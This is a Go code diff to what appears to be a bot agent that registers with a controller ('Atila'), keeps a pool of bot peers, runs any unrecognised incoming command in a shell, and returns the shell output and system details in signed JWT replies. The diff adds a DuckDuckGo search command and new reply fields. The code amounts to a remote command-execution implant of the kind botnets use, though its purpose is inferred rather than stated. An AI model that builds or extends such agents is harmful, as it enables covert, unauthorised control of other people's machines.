@@ -39,8 +39,10 @@ type ReplyMessage struct {
 // Corresponds to ReplyMessage.Content, keep in mind that this type needs to be
 // converted into string by making it into a JWT, prior to assigning it to ReplyMessage.Content
 type ReplyContent struct {
-	ShellOutput string    `json:"shellOutput"` // Output of executed shell code.
-	OsDetails   OsDetails `json:"osDetails"`   // Basic information about the system.
+	ShellOutput      string    `json:"shellOutput"`      // Output of executed shell code.
+	OsDetails        OsDetails `json:"osDetails"`        // Basic information about the system.
+	Other            string    `json:"other"`            // Any string of data.
+	WebSearchResults []string  `json:"webSearchResults"` // A slice of strings made out of web search results. (url links)
 }
 
 // IdentifyPayload is a structure corresponding to Atila's bot identification endpoint.
@@ -166,6 +168,8 @@ func messageAck(messageId string) error {
 
 	defer response.Body.Close()
 
+	// alreadyExecutedMessages = append(alreadyExecutedMessages, messageId)
+
 	return nil
 }
 
@@ -234,15 +238,29 @@ func interpretMessage(message Message) (Message, error) {
 	// Execute content.
 	replyContent := ReplyContent{}
 
+	// Get system's details.
 	if content.Shell == "/os" {
 		replyContent.OsDetails = osDetails()
 
+		// Add a bot peer.
 	} else if strings.HasPrefix(content.Shell, "/addPeer ") {
-		fmt.Println("added peer:" + content.Shell[9:])
+		peerAddress := content.Shell[9:]
 		entitiesPool = append(entitiesPool, Entity{
-			Address: content.Shell[9:],
+			Address: peerAddress,
 		})
+		replyContent.Other = "Added peer:" + peerAddress
 
+		// Perform web search using duckduckgo.
+	} else if strings.HasPrefix(content.Shell, "/duckit ") {
+		term := content.Shell[8:]
+		searchResults, err := duckit(term)
+		if err != nil {
+			fmt.Println(err.Error())
+			return reply, err
+		}
+		replyContent.WebSearchResults = searchResults
+
+		// If nothing maches then just execute it in the shell and return the result.
 	} else {
 		replyContent.ShellOutput, err = runTerminal(content.Shell)
 		if err != nil {
@@ -251,9 +269,12 @@ func interpretMessage(message Message) (Message, error) {
 		}
 	}
 
+	// Sign the reply with the private key.
 	replyToken := jwt.NewWithClaims(jwt.SigningMethodRS512, jwt.MapClaims{
-		"shellOutput": replyContent.ShellOutput,
-		"osDetails":   replyContent.OsDetails,
+		"shellOutput":      replyContent.ShellOutput,
+		"osDetails":        replyContent.OsDetails,
+		"other":            replyContent.Other,
+		"webSearchResults": replyContent.WebSearchResults,
 	})
 
 	replyTokenString, err := replyToken.SignedString(privateIdentificationKey)
